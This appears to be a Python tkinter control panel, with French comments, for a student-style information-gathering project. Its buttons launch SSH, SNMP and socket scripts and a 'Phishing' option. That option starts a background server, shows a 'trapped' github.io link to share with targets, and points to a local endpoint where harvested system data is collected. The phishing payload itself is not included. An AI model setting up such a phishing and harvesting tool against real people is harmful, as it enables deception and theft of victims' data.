import tkinter as tk
from tkinter import messagebox
import requests
import subprocess
import os
import smtplib
from tkinter import simpledialog


# Fonction pour gérer le clic sur "Phishing"
def phishing_action():
    # Lancement du script client_ph.py en arrière-plan
    try:
        subprocess.Popen(["python3", "Phishing/server_ph.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Création d'une fenêtre avec les nouvelles informations
        phishing_window = tk.Toplevel(root)
        phishing_window.title("Phishing")
        phishing_window.geometry("500x250")
        phishing_window.config(bg="#34495E")

        # Texte d'information dans la fenêtre
        label_url = tk.Label(
            phishing_window,
            text="Voici l'URL piégée à partager :",
            font=("Arial", 14),
            bg="#34495E",
            fg="#ECF0F1",
            pady=10
        )
        label_url.pack()

        # Affichage du lien piégé
        trap_link = tk.Label(
            phishing_window,
            text="https://sysprojet.github.io/",
            font=("Arial", 14, "bold"),
            bg="#34495E",
            fg="#1ABC9C",
            cursor="hand2"
        )
        trap_link.pack()

        # Rendre le lien piégé cliquable
        def open_trap_link(event):
            import webbrowser
            webbrowser.open("https://sysprojet.github.io/")

        trap_link.bind("<Button-1>", open_trap_link)

        # Texte pour l'URL du serveur
        label_server = tk.Label(
            phishing_window,
            text="Le serveur est en marche, récoltez les données via :",
            font=("Arial", 14),
            bg="#34495E",
            fg="#ECF0F1",
            pady=10
        )
        label_server.pack()

        # Affichage du lien serveur
        server_link = tk.Label(
            phishing_window,
            text="http://127.0.0.1:5000/api/system_info/data",
            font=("Arial", 14, "bold"),
            bg="#34495E",
            fg="#1ABC9C",
            cursor="hand2"
        )
        server_link.pack()

        # Rendre le lien serveur cliquable
        def open_server_link(event):
            import webbrowser
            webbrowser.open("http://127.0.0.1:5000/api/system_info/data")

        server_link.bind("<Button-1>", open_server_link)

        # Bouton pour fermer la fenêtre
        close_button = tk.Button(
            phishing_window,
            text="Fermer",
            command=phishing_window.destroy,
            font=("Arial", 12),
            bg="#1ABC9C",
            fg="#ECF0F1",
            activebackground="#16A085",
            activeforeground="#ECF0F1"
        )
        close_button.pack(pady=20)
    except Exception as e:
        messagebox.showerror("Erreur", f"Impossible de démarrer le script server_ph.py : {e}")

# Fonction pour afficher le contenu des informations
def display_system_info():
    info_window = tk.Toplevel(root)
    info_window.title("Information Locale")
    info_window.geometry("400x300")
    info_window.config(bg="#34495E")

    # Text widget pour afficher le contenu du fichier
    text_widget = tk.Text(info_window, wrap="word", font=("Arial", 12), bg="#ECF0F1", fg="#2C3E50")
    text_widget.pack(expand=True, fill="both", padx=10, pady=10)

    # Charger et afficher le contenu
    try:
        with open("system_info.txt", "r") as file:
            content = file.read()
            text_widget.insert("1.0", content)  # Insérer le contenu au début du widget Text
    except FileNotFoundError:
        text_widget.insert("1.0", "Le fichier 'system_info.txt' est introuvable.")
    except Exception as e:
        text_widget.insert("1.0", f"Une erreur est survenue : {e}")



# Fonction pour afficher le contenu
def display_local_info():
    info_window = tk.Toplevel(root)
    info_window.title("Information Locale")
    info_window.geometry("400x300")
    info_window.config(bg="#34495E")

    # Text widget pour afficher le contenu du fichier
    text_widget = tk.Text(info_window, wrap="word", font=("Arial", 12), bg="#ECF0F1", fg="#2C3E50")
    text_widget.pack(expand=True, fill="both", padx=10, pady=10)

    # Charger et afficher le contenu
    try:
        with open("local_info.txt", "r") as file:
            content = file.read()
            text_widget.insert("1.0", content)  # Insérer le contenu au début du widget Text
    except FileNotFoundError:
        text_widget.insert("1.0", "Le fichier 'local_info.txt' est introuvable.")
    except Exception as e:
        text_widget.insert("1.0", f"Une erreur est survenue : {e}")

# Fonction pour gérer le téléchargement du fichier et exécuter l'exécutable
def en_local_action():
    file_name = "En_local/info_local"  # Nom de l'exécutable à exécuter

    try:
        # Exécution de l'exécutable "info_local"
        try:
            subprocess.run([f"./{file_name}"], check=True)
            messagebox.showinfo("Exécution réussie", f"L'exécutable '{file_name}' a été exécuté avec succès.")

            # Afficher le contenu de local_info.txt dans une nouvelle fenêtre
            display_local_info()
        except FileNotFoundError:
            messagebox.showerror("Erreur", f"L'exécutable '{file_name}' est introuvable.")
        except subprocess.CalledProcessError:
            messagebox.showerror("Erreur", f"L'exécution de '{file_name}' a échoué.")
        except Exception as e:
            messagebox.showerror("Erreur", f"Une erreur est survenue lors de l'exécution : {e}")

    except Exception as e:
        messagebox.showerror("Erreur", f"Une erreur est survenue : {e}")

# Fonction pour afficher le contenu
def display_snmp_info():
    info_window = tk.Toplevel(root)
    info_window.title("Information SNMP")
    info_window.geometry("400x300")
    info_window.config(bg="#34495E")

    # Text widget pour afficher le contenu du fichier
    text_widget = tk.Text(info_window, wrap="word", font=("Arial", 12), bg="#ECF0F1", fg="#2C3E50")
    text_widget.pack(expand=True, fill="both", padx=10, pady=10)

    # Charger et afficher le contenu
    try:
        with open("snmp.txt", "r") as file:
            content = file.read()
            text_widget.insert("1.0", content)  # Insérer le contenu au début du widget Text
    except FileNotFoundError:
        text_widget.insert("1.0", "Le fichier 'snmp.txt' est introuvable.")
    except Exception as e:
        text_widget.insert("1.0", f"Une erreur est survenue : {e}")

# Fonction pour exécuter le script snmp.py
def run_snmp_script():
    try:
        # Exécution du script Python snmp.py
        subprocess.run(["python3", "SNMP/snmp.py"], check=True)
    except subprocess.CalledProcessError:
        messagebox.showerror("Erreur", "L'exécution du script SNMP a échoué.")
    except Exception as e:
        messagebox.showerror("Erreur", f"Une erreur est survenue : {e}")

# Fonction pour afficher le contenu
def display_socket_info():
    info_window = tk.Toplevel(root)
    info_window.title("Information Socket")
    info_window.geometry("400x300")
    info_window.config(bg="#34495E")

    # Text widget pour afficher le contenu du fichier
    text_widget = tk.Text(info_window, wrap="word", font=("Arial", 12), bg="#ECF0F1", fg="#2C3E50")
    text_widget.pack(expand=True, fill="both", padx=10, pady=10)

    # Charger et afficher le contenu de socket.txt
    try:
        with open("socket.txt", "r") as file:
            content = file.read()
            text_widget.insert("1.0", content)  # Insérer le contenu au début du widget Text
    except FileNotFoundError:
        text_widget.insert("1.0", "Le fichier 'socket.txt' est introuvable.")
    except Exception as e:
        text_widget.insert("1.0", f"Une erreur est survenue : {e}")

# Fonction pour exécuter le script so_cli.py
def run_so_cli_script():
    try:
        # Exécution du script Python so_cli.py
        subprocess.run(["python3", "Sockets/so_cli.py"], check=True)
        messagebox.showinfo("Succès", "Execution des Sockets avec succès.")

        # Ouvrir une fenêtre pour afficher le contenu de socket.txt après l'exécution réussie
        display_socket_info()

    except subprocess.CalledProcessError as e:
        messagebox.showerror("Erreur", "L'exécution des sockets a échoué.")
    except Exception as e:
        messagebox.showerror("Erreur", f"Une erreur est survenue : {e}")

# Fonction pour gérer les clics sur les options "A Distance"
def a_distance_action(option):
    if option == "SSH":
        open_ssh_window()  # Si on clique sur "SSH", ouvrir la fenêtre SSH
    elif option == "SNMP":
        run_snmp_script()  # Si on clique sur "SNMP", ouvrir la fenêtre SNMP
    elif option == "Sockets":
        run_so_cli_script()  # Si on clique sur "Sockets", exécuter le script so_cli.py
    elif option == "Phishing":
        phishing_action()
    else:
        messagebox.showinfo("A Distance", f"Vous avez cliqué sur '{option}'.")

# Fonction pour ouvrir la fenêtre SSH (à titre d'exemple)
def open_ssh_window():
    ssh_window = tk.Toplevel(root)
    ssh_window.title("Connexion SSH")
    ssh_window.geometry("300x300")
    ssh_window.config(bg="#34495E")

    # Labels et champs de saisie pour les informations SSH
    tk.Label(ssh_window, text="Nom d'utilisateur", font=("Arial", 12), bg="#34495E", fg="#ECF0F1").pack(pady=(10, 2))
    username_entry = tk.Entry(ssh_window, font=("Arial", 12))
    username_entry.pack(pady=5)

    tk.Label(ssh_window, text="Adresse IP", font=("Arial", 12), bg="#34495E", fg="#ECF0F1").pack(pady=(10, 2))
    ip_entry = tk.Entry(ssh_window, font=("Arial", 12))
    ip_entry.pack(pady=5)

    tk.Label(ssh_window, text="Mot de passe", font=("Arial", 12), bg="#34495E", fg="#ECF0F1").pack(pady=(10, 2))
    password_entry = tk.Entry(ssh_window, show="*", font=("Arial", 12))
    password_entry.pack(pady=5)

    # Fonction pour exécuter le script SSH
    def run_ssh_script():
        username = username_entry.get()
        ip_address = ip_entry.get()
        password = password_entry.get()

        if username and ip_address and password:
            try:
                # Exécution du script SSH
                subprocess.run(["SSH/new_ssh.sh", username, ip_address, password], check=True)
                messagebox.showinfo("Succès", "Le script SSH a été exécuté avec succès.", parent=ssh_window)

                # Afficher les informations système
                display_system_info()
            except subprocess.CalledProcessError as e:
                messagebox.showerror("Erreur", "L'exécution du script SSH a échoué", parent=ssh_window)
        else:
            messagebox.showwarning("Erreur de saisie", "Veuillez remplir tous les champs.", parent=ssh_window)

    # Bouton pour exécuter le script SSH
    action_button = tk.Button(
        ssh_window, text="Action!", command=run_ssh_script,
        font=("Arial", 12, "bold"), bg="#1ABC9C", fg="#ECF0F1",
        activebackground="#16A085", activeforeground="#ECF0F1", padx=10, pady=5
    )
    action_button.pack(pady=20)

# Fenêtre principale
root = tk.Tk()
root.title("Interface Principale")
root.geometry("400x300")
root.config(bg="#2C3E50")

# Bouton "En Local"
en_local_button = tk.Button(
    root,
    text="En Local",
    command=en_local_action,
    font=("Arial", 16, "bold"),
    bg="#1ABC9C",
    fg="#ECF0F1",
    activebackground="#16A085",
    activeforeground="#ECF0F1",
    padx=20,
    pady=10
)
en_local_button.pack(pady=20)

# Label "A Distance"
a_distance_label = tk.Label(
    root,
    text="A Distance",
    font=("Arial", 16, "bold"),
    bg="#34495E",
    fg="#ECF0F1",
    pady=10,
    padx=20
)
a_distance_label.pack(pady=(10, 0))

# Sous-options sous "A Distance"
subsection_frame = tk.Frame(root, bg="#2C3E50")
subsection_frame.pack(pady=10)

# Boutons sous "A Distance"
subsection_buttons = ["SSH", "SNMP", "Sockets", "Phishing"]

for subsection in subsection_buttons:
    button = tk.Button(
        subsection_frame,
        text=subsection,
        command=lambda s=subsection: a_distance_action(s),
        font=("Arial", 12),
        bg="#1ABC9C",
        fg="#ECF0F1",
        activebackground="#16A085",
        activeforeground="#ECF0F1",
        padx=10,
        pady=5
    )
    button.pack(side=tk.LEFT, padx=5, pady=5)

# Démarrer la boucle principale
root.mainloop()
